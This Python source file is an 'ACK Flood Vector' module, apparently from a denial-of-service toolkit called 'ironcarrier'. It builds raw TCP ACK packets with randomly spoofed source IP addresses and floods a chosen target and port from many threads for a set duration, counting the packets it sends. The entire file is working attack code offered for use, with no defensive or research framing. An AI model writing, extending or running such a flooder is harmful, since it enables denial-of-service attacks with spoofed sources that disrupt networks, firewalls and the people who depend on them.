#!/usr/bin/env python3
"""
ACK Flood Vector
TCP ACK flood targeting stateful firewalls
"""

import socket
import struct
import random
import time
import threading
from typing import Optional
from ironcarrier.core.stats import StatsCollector


class Attack:
    """ACK flood attack vector"""
    
    def __init__(self, target: str, port: int, duration: int,
                 threads: int = 100, stop_event: Optional[threading.Event] = None,
                 stats: Optional[StatsCollector] = None, **kwargs):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = threads
        self.stop_event = stop_event or threading.Event()
        self.stats = stats or StatsCollector()
        self.ttl = kwargs.get('ttl', 64)
        self._resolved_target = None
    
    def _resolve_target(self) -> str:
        if self._resolved_target:
            return self._resolved_target
        self._resolved_target = socket.gethostbyname(self.target)
        return self._resolved_target
    
    def _build_packet(self) -> bytes:
        dst_ip = self._resolve_target()
        src_ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        
        tcp_header = struct.pack(
            '!HHIIBBHHH',
            random.randint(1024, 65535), self.port,
            random.randint(0, 0xFFFFFFFF), random.randint(0, 0xFFFFFFFF),
            (5 << 4), 0x10, 65535, 0, 0
        )
        
        ip_header = struct.pack(
            '!BBHHHBBH4s4s',
            0x45, 0, 40,
            random.randint(0, 65535), 0x4000, self.ttl, 6, 0,
            socket.inet_aton(src_ip), socket.inet_aton(dst_ip)
        )
        
        return ip_header + tcp_header
    
    def _attack_thread(self) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        end_time = time.time() + self.duration
        dst = (self._resolve_target(), self.port)
        
        while time.time() < end_time and not self.stop_event.is_set():
            try:
                sock.sendto(self._build_packet(), dst)
                self.stats.add_packets(1, 40)
            except Exception:
                self.stats.add_error()
        sock.close()
    
    def run(self) -> None:
        self._resolve_target()
        threads = [threading.Thread(target=self._attack_thread, daemon=True) for _ in range(self.threads)]
        for t in threads: t.start()
        for t in threads: t.join(timeout=self.duration + 5)
